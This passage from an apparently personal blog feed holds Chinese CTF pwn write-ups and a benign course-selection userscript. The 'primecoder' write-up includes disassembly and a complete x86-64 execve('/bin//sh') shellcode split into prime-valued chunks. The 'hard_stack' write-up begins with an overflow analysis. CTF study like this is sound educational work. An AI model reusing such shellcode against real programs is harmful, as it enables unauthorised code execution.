    <content type="html"><![CDATA[<p>其实感觉这道题有点偏？🤔🤔🤔 <span id="more"></span></p><h2 id="大致分析检查">大致分析检查</h2><p>先走一遍流程：checksec ida</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">┌──(kali㉿helloeveryone)-[~/ctf/pwn/q31_primecoder]</span><br><span class="hljs-string">└─$</span> <span class="hljs-string">checksec</span> <span class="hljs-string">primecoder</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/kali/ctf/pwn/q31_primecoder/primecoder&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">unknown</span> <span class="hljs-bullet">-</span> <span class="hljs-string">GNU_STACK</span> <span class="hljs-string">missing</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-string">Executable</span><br>    <span class="hljs-attr">RWX:</span>      <span class="hljs-string">Has</span> <span class="hljs-string">RWX</span> <span class="hljs-string">segments</span><br>    <span class="hljs-attr">FORTIFY:</span>  <span class="hljs-string">Enabled</span><br></code></pre></td></tr></table></figure><p>在ida里F5失效，锁定那一行，分析汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nasm">call rbp<br></code></pre></td></tr></table></figure><p>结合上下文来看，应该是要在rbp处执行shellcode</p><h2 id="程序流程分析">程序流程分析</h2><p>首先应清楚linux-amd64调用函数传参约定</p><h3 id="入参">入参</h3><ul><li>在参数都是小于等于 16 字节的整数/枚举/结构体时，前六个参数分别由<strong>RDI、RSI、RDX、RCX、R8、R9</strong><strong><em>（这部分是重点，有助于看懂本题涉及代码）</em></strong>传递（超过 8字节的用连续的两个寄存器），剩下的参数用栈传递（参数在内存中的相对位置恰好和参数实际位置一致）。小于64 位的值占用寄存器的低位，高位数据无效。</li><li>在参数都是浮点时，大致和前面一样，不同的是前八个参数用的寄存器是xmm0～xmm7。</li><li>如果是整形和浮点混用，那么依次用整形寄存器和浮点寄存器传递，直到把这6+8 个寄存器用完为止。</li><li>在参数存在大于 16 字节的结构体是直接用栈传递。</li></ul><h3 id="返回值">返回值</h3><ul><li>被调用函数的返回值是64位以内（包括64位）的整形或指针时，则返回值会被存放于RAX，如果返回值是128位的，则高64位放入 RDX；</li><li>如果返回值是浮点值，则返回值存放在XMM0；</li><li>更大的返回值(比如结构体)，由调用方在栈上分配空间，并由 RCX持有该空间的指针并传递给被调用函数，因此整型参数使用的寄存器依次右移一格，实际只可以利用RDI，RSI，RDX，R8，R9，5个寄存器，其余参数通过栈传递。函数调用结束后，RAX返回该空间的指针（即函数调用开始时的 RCX 值）。</li></ul><h3 id="正式分析">正式分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs nasm">.text:0000000000400560 ; int __cdecl main(int argc, const char **argv, const char **envp)<br>.text:0000000000400560                 public main<br>.text:0000000000400560 main            proc near               ; DATA XREF: _start+1D↓o<br>.text:0000000000400560<br>.text:0000000000400560 var_42C         = dword ptr -42Ch<br>.text:0000000000400560 var_41C         = qword ptr -41Ch<br>.text:0000000000400560<br>.text:0000000000400560 ; __unwind &#123;<br>.text:0000000000400560                 push    r12<br>.text:0000000000400562                 push    rbp<br>.text:0000000000400563                 xor     ecx, ecx        ; n<br>.text:0000000000400565                 push    rbx<br>.text:0000000000400566                 mov     edx, 2          ; modes<br>.text:000000000040056B                 xor     esi, esi        ; buf<br>.text:000000000040056D                 xor     ebx, ebx<br>.text:000000000040056F                 sub     rsp, 420h<br>.text:0000000000400576                 mov     rdi, cs:stdin@@GLIBC_2_2_5 ; stream<br>.text:000000000040057D                 lea     rbp, [rsp+32]<br>.text:0000000000400582                 lea     r12, [rsp+28]<br>.text:0000000000400587                 call    _setvbuf<br>.text:000000000040058C                 mov     rdi, cs:__bss_start ; stream<br>.text:0000000000400593                 xor     ecx, ecx        ; n<br>.text:0000000000400595                 mov     edx, 2          ; modes<br>.text:000000000040059A                 xor     esi, esi        ; buf<br>.text:000000000040059C                 call    _setvbuf<br>.text:00000000004005A1                 lea     rsi, aBufferP   ; &quot;buffer = %p.\n&quot;<br>.text:00000000004005A8                 mov     rdx, rbp<br>.text:00000000004005AB                 mov     edi, 1<br>.text:00000000004005B0                 xor     eax, eax<br>.text:00000000004005B2                 call    ___printf_chk<br>.text:00000000004005B7<br>.text:00000000004005B7 loc_4005B7:                             ; CODE XREF: main+BF↓j<br>.text:00000000004005B7                 lea     rdi, format     ; &quot;%u&quot;<br>.text:00000000004005BE                 xor     eax, eax<br>.text:00000000004005C0                 mov     rsi, r12<br>.text:00000000004005C3                 call    _scanf<br>.text:00000000004005C8                 inc     eax<br>.text:00000000004005CA                 cmp     eax, 1<br>.text:00000000004005CD                 jbe     short loc_400621<br>.text:00000000004005CF                 mov     edi, [rsp+28]   ; __int64<br>.text:00000000004005D3                 mov     [rsp+12], edi<br>.text:00000000004005D7                 call    _Z6millerx      ; miller(long long)<br>.text:00000000004005DC                 test    al, al<br>.text:00000000004005DE                 mov     edx, [rsp+12]   ; edx为input<br>.text:00000000004005E2                 jz      short loc_400606<br>.text:00000000004005E4                 lea     rsi, aGoodUIsPrime ; &quot;Good! %u is prime.\n&quot;<br>.text:00000000004005EB                 mov     edi, 1<br>.text:00000000004005F0                 xor     eax, eax<br>.text:00000000004005F2                 call    ___printf_chk<br>.text:00000000004005F7                 mov     edx, [rsp+28]<br>.text:00000000004005FB                 movsxd  rax, ebx<br>.text:00000000004005FE                 inc     ebx             ; 循环次数<br>.text:0000000000400600                 mov     [rsp+rax*4+32], edx ; 第一次rax=1<br>.text:0000000000400604                 jmp     short loc_400619<br>.text:0000000000400606 ; ---------------------------------------------------------------------------<br>.text:0000000000400606<br>.text:0000000000400606 loc_400606:                             ; CODE XREF: main+82↑j<br>.text:0000000000400606                 lea     rsi, aBadUIsNotPrime ; &quot;Bad! %u is not prime.\n&quot;<br>.text:000000000040060D                 mov     edi, 1<br>.text:0000000000400612                 xor     eax, eax<br>.text:0000000000400614                 call    ___printf_chk<br>.text:0000000000400619<br>.text:0000000000400619 loc_400619:                             ; CODE XREF: main+A4↑j<br>.text:0000000000400619                 cmp     ebx, 255<br>.text:000000000040061F                 jle     short loc_4005B7<br>.text:0000000000400621<br>.text:0000000000400621 loc_400621:                             ; CODE XREF: main+6D↑j<br>.text:0000000000400621                 call    rbp<br>.text:0000000000400623                 add     rsp, 1056<br>.text:000000000040062A                 xor     eax, eax<br>.text:000000000040062C                 pop     rbx<br>.text:000000000040062D                 pop     rbp<br>.text:000000000040062E                 pop     r12<br>.text:0000000000400630                 retn<br>.text:0000000000400630 ; &#125; // starts at 400560<br>.text:0000000000400630 main            endp<br></code></pre></td></tr></table></figure><p>先观察rbp，其最后一次被改变是在 <code>0x000000000040057D</code> ，<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nasm">lea     rbp, [rsp+32]<br></code></pre></td></tr></table></figure> 这也是将buffer的地址加载到rbp里</p><p>再继续分析流程，<code>_scanf</code>读入一个4字节无符号整数到rsi寄存器中存储的地址，即上一步r12的地址（涉及的代码如下），<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nasm">lea     r12, [rsp+28]<br>...<br>mov     rsi, r12<br></code></pre></td></tr></table></figure> 若输入非空则将那个数传给edi和地址 <code>[rsp+12]</code>，并代入函数 <code>_Z6millerx</code>做判断。判断成功则把那个数传给edx并写入 <code>[rsp+rax*4+32]</code>，即buffer</p><p>总结一下，即只有被该程序判定为质数的4字节无符号整数才能被存入buffer并在输入为空后被执行，即我们得让shellcode可以被分成许多4字节质数输入内存。</p><h2 id="构造shellcode">构造shellcode</h2><p>有用的网站：<ahref="https://defuse.ca/online-x86-assembler.htm#disassembly">Online x86/ x64 Assembler and Disassembler</a></p><p>要用syscall调用shell，各个寄存器的值应是：</p><ul><li>rax : 0x3b (系统调用号)</li><li>rdi : rsp的地址 (先要把/bin//sh压入栈顶)</li><li>rdx : 0</li><li>rsi : 0</li></ul><p>可以考虑将shellcode分解成一系列小片段，较少连续性，易于形成质数。</p><ul><li>注意：程序为小端序，shellcode执行也是从低地址到高地址，因此对应整数是倒过来看的</li></ul><p>例如下面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nasm">cdq         ;0x99<br>push rdx    ;0x52<br>cdq         ;0x99<br>pop rsi     ;0x5e<br><br>;对应的就是0x5e995299<br></code></pre></td></tr></table></figure><p>下面是作者找到的一些质数对应的汇编代码，基本覆盖全面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs nasm">cdq<br>push rdx<br>cdq<br>pop rsi<br><br>cdq<br>xor rax,rax<br><br>cdq<br>cdq<br>push rdx<br>cdq<br><br>cdq<br>push rdx<br>pop rdi<br>push rdx<br><br>pop rdi<br>pop rdi<br>pop r9<br><br>shl r9,0x20<br><br>cdq<br>shr r9,1<br><br>;2 int<br>cdq<br>nop<br>mov r9d,0x68732f2f<br><br>;3 int<br>pop rdi<br>cdq<br>nop<br>add r9d,0x6e69622f<br>cdq<br>nop<br><br>;3<br>pop rdi<br>mov dl,0x0c<br>add r9,0x6e69622f<br>cdq<br>nop<br><br>cdq<br>push r9<br>nop<br><br>cdq<br>pop r10<br>nop<br><br>cdq<br>add rdi,r9<br><br>cdq<br>push rsp<br>mov dl,0x16<br><br>syscall<br>mov dl,0x5<br><br>mov bl,0x2<br>mov al,0x3b<br></code></pre></td></tr></table></figure><h3 id="寻找技巧">寻找技巧</h3><ul><li>多运用单字节、双字节的字节码，如: <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nasm">cdq       ;0x99<br>nop       ;0x90<br>pop rdi   ;0x5f<br>push r9   ;0x41 0x51<br></code></pre></td></tr></table></figure></li><li>对一些需要凑成两到三个质数的可以用特定指令进行爆破<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nasm">mov dl,0x??   ;0xb2 0x??  ??相同<br>;同理，可以是bl等，但需是无用的寄存器<br></code></pre></td></tr></table></figure></li></ul><h3 id="完整shellcode">完整shellcode</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs nasm">cdq<br>push rdx<br>cdq<br>pop rsi<br><br>cdq<br>push rdx<br>pop rdi<br>push rdx<br><br>cdq<br>nop<br>mov r9d,0x68732f2f<br><br>cdq<br>shr r9,1<br><br>cdq<br>shr r9,1<br><br>cdq<br>shr r9,1<br><br>cdq<br>shr r9,1<br><br>cdq<br>shr r9,1<br><br>cdq<br>shr r9,1<br><br>cdq<br>shr r9,1<br><br>cdq<br>shr r9,1<br><br>shl r9,0x20<br><br>pop rdi<br>mov dl,0x0c<br>add r9,0x6e69622f<br>cdq<br>nop<br><br>cdq<br>push r9<br>nop<br><br>cdq<br>push rsp<br>mov dl,0x16<br><br>pop rdi<br>cdq<br>nop<br>add r9d,0x6e69622f<br>cdq<br>nop<br><br>cdq<br>xor rax,rax<br><br>mov bl,0x2<br>mov al,0x3b<br><br>syscall<br>mov dl,0x5<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf_pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>writeup</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于油猴的sep选课脚本安装使用</title>
    <link href="/2024/02/26/select-course-ucas/"/>
    <url>/2024/02/26/select-course-ucas/</url>
    
    <content type="html"><![CDATA[<p>本人上学期有两门课因为找了半天课在哪没选到课（火大😤），决定写一个帮选的脚本（只是相当于ctrl+F），即在进入选课界面后立即选好所有要选的课程，只需填入验证码并提交</p><span id="more"></span><h2 id="下载油猴">下载油猴</h2><p><strong>油猴</strong>（<strong>Tampermonkey</strong>）是一个浏览器插件，可以用本地脚本修改被访问网页。</p><blockquote><p><strong>官网介绍</strong></p><p>它允许用户自定义并增强您最喜爱的网页的功能。用户脚本是小型 JavaScript程序，可用于向网页添加新功能或修改现有功能。使用篡改猴，您可以轻松在任何网站上创建、管理和运行这些用户脚本。</p><p>例如，使用篡改猴，您可以向网页添加一个新按钮，可以快速在社交媒体上分享链接，或自动填写带有个人信息的表格。在数字化时代，这特别有用，因为网页常常被用作访问广泛的服务和应用程序的用户界面。</p></blockquote><h3 id="edge浏览器方法">1.edge浏览器方法</h3><p>点击右上角的三个点，选择 <strong><em>扩展</em></strong> ，点击<strong><em>管理扩展</em></strong></p><p><img src="select_course_youhou_ysj.png" alt="三个点" /> <imgsrc="select_course_youhou_kz.png" alt="点扩展" /></p><p>然后划到最底下，点击 <strong><em>获取 Microsoft Edge扩展</em></strong>，在搜索框里搜索 <strong>Tampermonkey</strong></p><figure><img src="select_course_youhou_hqtz.png"alt="获取 Microsoft Edge 扩展" /><figcaption aria-hidden="true">获取 Microsoft Edge 扩展</figcaption></figure><p>找到下面这个就是（我的已经下载过了）</p><figure><img src="youhou.png" alt="油猴" /><figcaption aria-hidden="true">油猴</figcaption></figure><p>下载好后在浏览器导航栏点击扩展小图标，让它在工具栏里显示</p><figure><img src="屏幕截图%202024-02-26%20134723.png" alt="显示它!" /><figcaption aria-hidden="true">显示它!</figcaption></figure><h3 id="其他浏览器">2.其他浏览器</h3><p>可以参考下面这几篇文章</p><p><ahref="https://blog.csdn.net/qq_42951560/article/details/109233301">油猴（Tampermonkey）安装教程</a></p><p><ahref="https://zhuanlan.zhihu.com/p/128453110">Tampermonkey油猴插件——安装与使用教程</a></p><p><ahref="https://zhuanlan.zhihu.com/p/387251122">最强浏览器插件：油猴脚本的安装及使用教程</a></p><h2 id="安装并使用选课脚本">安装并使用选课脚本</h2><p>点击导航栏上的小图标，点击添加新脚本，把原有默认的所有代码都删掉，将下面代码复制粘贴进去并保存</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// ==UserScript==</span><br><span class="hljs-comment">// @name         sep选课助手</span><br><span class="hljs-comment">// @namespace    https://gitee.com/dx3906999</span><br><span class="hljs-comment">// @version      2024-02-06</span><br><span class="hljs-comment">// @description  sep自动选择想选课程</span><br><span class="hljs-comment">// @author       dx3906999</span><br><span class="hljs-comment">// @match        https://xkcts.ucas.ac.cn/courseManageBachelor/selectCourse*</span><br><span class="hljs-comment">// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==</span><br><span class="hljs-comment">// @grant        none</span><br><span class="hljs-comment">// ==/UserScript==</span><br><br>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-string">&#x27;use strict&#x27;</span>;<br>    <span class="hljs-keyword">var</span> class_checkbox_elements=<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&quot;sids&quot;</span>);<br>    <br>    <span class="hljs-keyword">var</span> class_ids=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;class_checkbox_elements.<span class="hljs-property">length</span>;i++)&#123;<br>        class_ids[i]=class_checkbox_elements[i].<span class="hljs-property">value</span>;<br>    &#125;;<br><br>    <span class="hljs-keyword">var</span> class_codes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j=<span class="hljs-number">0</span>;j&lt;class_checkbox_elements.<span class="hljs-property">length</span>;j++)&#123;<br>        class_codes[j]=<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;courseCode_&quot;</span>+class_ids[j]).<span class="hljs-property">textContent</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">var</span> sep_helper_str=<span class="hljs-string">&quot;B02GB003Y-03&quot;</span><span class="hljs-comment">//改成课程编号，格式是课程编号中间用空格连接</span><br><br><span class="hljs-comment">/*例子:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    var sep_helper_str=&quot;B02GB003Y-04 B02GB003Y-03 B02GB003Y-05&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br>    <span class="hljs-keyword">var</span> classes_selected=sep_helper_str.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot; &quot;</span>);<br>    <span class="hljs-keyword">var</span> class_index;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> k=<span class="hljs-number">0</span>;k&lt;classes_selected.<span class="hljs-property">length</span>;k++)&#123;<br>        class_index=class_codes.<span class="hljs-title function_">indexOf</span>(classes_selected[k]);<br>        <span class="hljs-keyword">if</span> (class_index!=-<span class="hljs-number">1</span>) &#123;<br>            class_checkbox_elements[class_index].<span class="hljs-property">checked</span>=<span class="hljs-literal">true</span>;<br>        &#125;<br>        <br>    &#125;<br><br>&#125;)();<br><br></code></pre></td></tr></table></figure><p>使用时按中间那项说明修改代码即可</p>]]></content>
    
    
    
    <tags>
      
      <tag>选课</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一道校内pwn题——hard_stack</title>
    <link href="/2024/02/25/ucas-ctf-pwn-hard-stack/"/>
    <url>/2024/02/25/ucas-ctf-pwn-hard-stack/</url>
    
    <content type="html"><![CDATA[<p>日常刷刷题 <span id="more"></span></p><p>先 <code>checksec</code> 一下 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh">┌──(kali㉿helloeveryone)-[~/ctf/pwn/q20_hardstack]<br>└─$ checksec --file=hard_stack<br>[*] <span class="hljs-string">&#x27;/home/kali/ctf/pwn/q20_hardstack/hard_stack&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br></code></pre></td></tr></table></figure> 没有金丝雀, 地址随机化,用户栈不可执行</p><p>再丢进ida看眼，<code>F5</code>一下</p><p>main: <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  FILE *stream; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  stream = fopen(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !stream )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Something wrong with flag file.&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  fgets(s, <span class="hljs-number">64</span>, stream);<span class="hljs-comment">//将字符串读到s中</span><br>  sub_400acd();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Bye~&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></p><p>sub_400acd: <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">sub_400acd</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">ssize_t</span> result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">45</span>]; <span class="hljs-comment">// [rsp+Fh] [rbp-31h] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+3Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Who are you?&quot;</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    result = read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">1uLL</span>);                <span class="hljs-comment">//一次从缓冲区读一个字节</span><br>    <span class="hljs-keyword">if</span> ( result != <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">break</span>;<br>    result = (<span class="hljs-type">unsigned</span> __int8)buf[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">if</span> ( buf[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\n&#x27;</span> )<br>      <span class="hljs-keyword">break</span>;<br>    buf[i + <span class="hljs-number">1</span>] = buf[<span class="hljs-number">0</span>];                        <span class="hljs-comment">// 漏洞:只要没有读入换行符或EOF就会一直读，造成栈溢出</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> result;                                <span class="hljs-comment">// 可以劫持程序流程</span><br>&#125;<br></code></pre></td></tr></table></figure> 在ida里看看其他函数</p><p>找到一个获得flag的函数 <code>sub_40076d</code> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sub_40067d</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(s);                               <span class="hljs-comment">//s即为刚刚读取flag的字符串地址</span><br>&#125;<br></code></pre></td></tr></table></figure>现在可以分析一下漏洞函数 <code>sub_400acd</code> 的栈了 <figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 